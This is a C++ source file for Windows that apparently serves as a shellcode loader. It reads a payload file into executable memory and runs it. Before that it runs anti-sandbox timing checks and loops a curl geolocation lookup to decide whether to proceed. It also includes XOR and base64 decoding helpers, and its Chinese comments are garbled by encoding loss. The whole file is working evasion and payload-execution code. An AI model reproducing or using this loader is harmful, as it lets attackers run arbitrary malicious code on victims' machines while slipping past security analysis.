#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <chrono>
#include <thread>
#include <random>
#include <algorithm>
#include <numeric>
#include <functional>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <sstream>  
#include <iostream>
#include <cstdlib>
#include <string>
#include <memory>
#include <stdexcept>
#include <array>
#include <windows.h>
#include <fstream>
#include <cstring>
#include <iostream>
using namespace std;

void isTimeAccelerated() {
    auto start = std::chrono::steady_clock::now();

    std::this_thread::sleep_for(std::chrono::seconds(5));

    auto end = std::chrono::steady_clock::now();

    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    while (duration.count() < 5000) {
        std::cout << "F" << std::endl;

        double* pvalue = NULL; // ��ʼ��Ϊ null ��ָ��
        pvalue = new double;   // Ϊ���������ڴ�

        *pvalue = 29494.99;     // �ڷ���ĵ�ַ�洢ֵ

        delete pvalue;         // �ͷ��ڴ�
    }
}

void ddt() {
    using namespace std::chrono;

    // ��ʼ����
    int counter = 1;

    // ��ȡ��ǰʱ���
    auto start_time = high_resolution_clock::now();

    // ������1ֱ��5���ȥ
    while (true) {
        // ��ȡ��ǰʱ��
        auto current_time = high_resolution_clock::now();

        // �����ȥ��ʱ��
        auto duration = duration_cast<seconds>(current_time - start_time);

        // ���5���Ѿ���ȥ�����˳�ѭ��
        if (duration.count() >= 5) {
            break;
        }

        // ���ӱ���
        counter++;
    }

    // ������
    //std::cout << "��5���ڣ�������1���ӵ���" << counter << std::endl;

    while (counter < 80000000) {
        std::cout << "F" << std::endl;

        double* pvalue = NULL; // ��ʼ��Ϊ null ��ָ��
        pvalue = new double;   // Ϊ���������ڴ�

        *pvalue = 29494.99;     // �ڷ���ĵ�ַ�洢ֵ

        delete pvalue;         // �ͷ��ڴ�

        //Sleep(1);
    }
    return ;
}

void ip() {
    while (true) {

        // ִ�� curl �������ȡ���
        const char* cmd = "curl -s https://myip.ipip.net/";

        // �� char* ת��Ϊ wchar_t*��ʹ�ð�ȫ���� mbstowcs_s��
        size_t cmdLength = strlen(cmd) + 1;
        std::wstring wCmd(cmdLength, L'\0');
        size_t convertedChars = 0;

        // ʹ�� mbstowcs_s ת�� char* �� wchar_t*
        errno_t err = mbstowcs_s(&convertedChars, &wCmd[0], wCmd.size(), cmd, cmdLength);
        if (err != 0) {
            std::cerr << "Error converting char* to wchar_t*.\n";
            exit(1);
        }

        // ���������е����������
        std::array<char, 128> buffer;
        std::string result;

        // ͨ�� CreateProcess ִ������
        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.lpSecurityDescriptor = NULL;
        saAttr.bInheritHandle = TRUE;

        HANDLE hReadPipe, hWritePipe;
        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
            std::cerr << "Failed to create pipe\n";
            exit(1);
        }

        PROCESS_INFORMATION piProcInfo;
        STARTUPINFO siStartInfo;
        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
        ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));

        siStartInfo.cb = sizeof(STARTUPINFO);
        siStartInfo.hStdOutput = hWritePipe;
        siStartInfo.hStdError = hWritePipe;
        siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

        // �������̣�ʹ�ÿ��ַ��汾�� CreateProcessW
        if (!CreateProcessW(NULL, &wCmd[0], NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
            std::cerr << "CreateProcess failed\n";
            exit(1);
        }

        // �ر�д�ܵ�
        CloseHandle(hWritePipe);

        // ��ȡ��������
        DWORD dwRead;
        char szBuffer[4096];
        while (true) {
            if (!ReadFile(hReadPipe, szBuffer, sizeof(szBuffer) - 1, &dwRead, NULL) || dwRead == 0)
                break;
            szBuffer[dwRead] = '\0';  // ȷ����ȡ���������� \0 �������ַ���
            result += szBuffer;
        }

        // �ȴ����̽���
        WaitForSingleObject(piProcInfo.hProcess, INFINITE);

        // �رվ��
        CloseHandle(hReadPipe);
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

        // �������������Ƿ���� "�й�"
        if (result.find("�й�") == std::string::npos) {
            break;
        }
    }
}

int decryptKey(int diff, int minValue, int maxValue) {

    for (int num = minValue; num <= maxValue; num++) {

        int randomValue = diff + num;

        if (520519 < randomValue && randomValue < 520521) {
            return randomValue;
        }
    }

}

std::string xorDecrypt(const std::string& data, const std::string& key) {

    std::string decryptedData;
    for (std::size_t i = 0; i < data.length(); ++i) {
        decryptedData += data[i] ^ key[i % key.length()];
    }
    return decryptedData;
}


void RingQ(const std::string& file_path) {

    const char* filePath = "main.txt"; // ��� shellcode �ļ�·��
    std::ifstream shellcodeFile(filePath, std::ios::binary | std::ios::ate);


    // ��ȡ�ļ���С
    std::streamsize byte_sequence_length = shellcodeFile.tellg();
    shellcodeFile.seekg(0, std::ios::beg);

    // �����ڴ沢��ȡ�ļ����ݵ��ڴ���
    char* byte_sequence = new char[byte_sequence_length];

    // �����ִ���ڴ�
    LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // ���ļ����ݿ�����������ڴ�
    memcpy(execMemory, byte_sequence, byte_sequence_length);
    delete[] byte_sequence;

    // ���ڴ��ַת��Ϊ����ָ��
    typedef void (*ShellcodeFunc)();
    ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);

    // ִ�� shellcode
    shellcodeFunc();

    // �ͷŷ�����ڴ�
    VirtualFree(execMemory, 0, MEM_RELEASE);

}

// Base64 ���뺯��
std::vector<unsigned char> base64_decode(const std::string& in) {
    std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t len = in.size();
    size_t padding = 0;
    if (len > 1 && in[len - 1] == '=') padding++;
    if (len > 2 && in[len - 2] == '=') padding++;

    size_t decoded_size = (len * 3) / 4 - padding;
    std::vector<unsigned char> decoded_data(decoded_size);

    int val = 0, valb = -8;
    size_t j = 0;

    for (size_t i = 0; i < len; ++i) {
        char c = in[i];
        if (c == '=' || base64_chars.find(c) == std::string::npos) continue;

        val = (val << 6) + base64_chars.find(c);
        valb += 6;
        if (valb >= 0) {
            decoded_data[j++] = (val >> valb) & 0xFF;
            valb -= 8;
        }
    }
    return decoded_data;
}

int main(int argc, char* argv[]) {

    if (argc != 3 || std::strcmp(argv[1], "-file") != 0) {
        return -1;
    }

    isTimeAccelerated();
    ddt();
    ip();
    //std::string file_path = "main.txt";
    //RingQ(file_path);

    // ��������в���

    // ��ȡ shellcode �ļ�·��
    const char* filePath = argv[2];
    std::ifstream shellcodeFile(filePath, std::ios::binary | std::ios::ate);

    if (!shellcodeFile.is_open()) {
        //std::cerr << "Failed to open shellcode file: " << filePath << std::endl;
        return -1;
    }

    // ��ȡ�ļ���С
    std::streamsize byte_sequence_length = shellcodeFile.tellg();
    shellcodeFile.seekg(0, std::ios::beg);

    // �����ڴ沢��ȡ�ļ����ݵ��ڴ���
    char* byte_sequence = new char[byte_sequence_length];
    if (!shellcodeFile.read(byte_sequence, byte_sequence_length)) {
        //std::cerr << "Failed to read shellcode from file: " << filePath << std::endl;
        delete[] byte_sequence;
        return -1;
    }

    // �����ִ���ڴ�
    LPVOID execMemory = VirtualAlloc(NULL, byte_sequence_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == NULL) {
        //std::cerr << "Failed to allocate memory." << std::endl;
        delete[] byte_sequence;
        return -1;
    }

    // ���ļ����ݿ�����������ڴ�
    memcpy(execMemory, byte_sequence, byte_sequence_length);
    //delete[] byte_sequence;

    // ���ڴ��ַת��Ϊ����ָ��
    typedef void (*ShellcodeFunc)();
    ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);

    // ִ�� shellcode
    shellcodeFunc();

    // �ͷŷ�����ڴ�
    VirtualFree(execMemory, 0, MEM_RELEASE);

    //system("pause");
}